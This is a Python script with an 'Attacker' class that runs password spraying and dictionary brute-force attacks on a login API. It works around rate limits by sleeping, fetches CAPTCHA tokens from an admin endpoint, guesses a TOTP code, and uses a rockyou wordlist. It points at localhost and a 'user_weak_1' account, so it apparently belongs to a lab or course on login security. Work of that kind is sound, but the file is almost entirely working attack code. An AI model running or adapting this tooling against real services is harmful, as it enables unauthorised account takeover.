import os
import time
import json
import requests

class Attacker:
    def __init__(self, base_url, dictionary_path, users_path, group_seed):
        self.base_url = base_url
        self.dictionary_path = dictionary_path
        self.users_path = users_path
        self.group_seed = group_seed
        self.password_list = self.get_password_list()
        self.session = requests.Session()
        
    def get_password_list(self):
        with open(self.dictionary_path, "r") as f:
            return [line.strip() for line in f.readlines()]
        
    def get_captcha_token(self):
        url = f"{self.base_url}/admin/get_captcha_token"
        try:
            resp = self.session.get(url, params={"group_seed": self.group_seed})
            if resp.status_code == 200:
                return resp.json().get("captcha_token")
        except Exception as e:
            print(f"Error: {e}")
        return None

    def login_attempt(self, username, password, captcha_token=None):
        url = f"{self.base_url}/login"
        payload = {
            "username": username,
            "password": password
        }
        if captcha_token:
            payload["captcha_token"] = captcha_token   
        return self.session.post(url, json=payload)
    
    def login_totp(self, username, token_attempt):
        url = f"{self.base_url}/login_totp"
        payload = {"username": username, "totp_token": token_attempt}
        return self.session.post(url, json=payload)
    
    def run_password_spraying(self, top_n=5):
        usernames = []
        with open(self.users_path, 'r') as f:
            users_data = json.load(f)
            usernames = [u['username'] for u in users_data["users"]]

        common_passwords = []
        with open(self.dictionary_path, 'r', encoding='utf-8', errors='ignore') as f:
            for i, line in enumerate(f):
                if i >= top_n: break
                common_passwords.append(line.strip())

        active_targets = usernames.copy()
        
        for password in common_passwords:
            cracked_in_round = []
            for username in active_targets:
                resp = self.login_attempt(username, password, captcha_token=None)
                data = resp.json()
                status = data.get("status")
                
                match status:
                    case "success":
                        print(f"{username} cracked with password {password}")
                        cracked_in_round.append(username)
                    case "totp_required":
                        totp_resp = self.login_totp(username, "12345")
                        return totp_resp.json().get("status") == "totp_success"
                    case "rate_limit_reached":
                        # sleep for window
                        print("sleeping for: ", data.get("retry_after"))
                        time.sleep(data.get("retry_after"))


    def run_brute_force(self, target_username, target_totp_secret=None):
        for password in self.password_list:
            captcha_token = None
            while True:
                resp = self.login_attempt(target_username, password, captcha_token=captcha_token)
                data = resp.json()
                status = data.get("status")

                match status:
                    case "success":
                        return True
                    case "totp_required":
                        totp_resp = self.login_totp(target_username, "12345")
                        return totp_resp.json().get("status") == "totp_success"
                    case "rate_limit_reached":
                        # sleep for window
                        print("sleeping for: ", data.get("retry_after"))
                        time.sleep(data.get("retry_after"))
                    case "captcha_required":
                        captcha_token = self.get_captcha_token()
                    case "account_locked":
                        return False
                    case "failure":
                        break
        return False
    
    
    
    
if __name__ == "__main__":  
    CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
    PROJECT_ROOT = os.path.dirname(CURRENT_DIR)
    ASSETS_DIR = os.path.join(PROJECT_ROOT, 'assets')
    
    DICTIONARY_FILE_PATH = os.path.join(ASSETS_DIR, 'rockyou_top_50k.txt')
    USERS_FILE_PATH = os.path.join(ASSETS_DIR, 'users.json')
    
    BASE_URL = "http://127.0.0.1:5000"
    GROUP_SEED = "214265977"
    
    attacker = Attacker(BASE_URL, DICTIONARY_FILE_PATH, USERS_FILE_PATH, GROUP_SEED)
    attacker.run_brute_force("user_weak_1")
    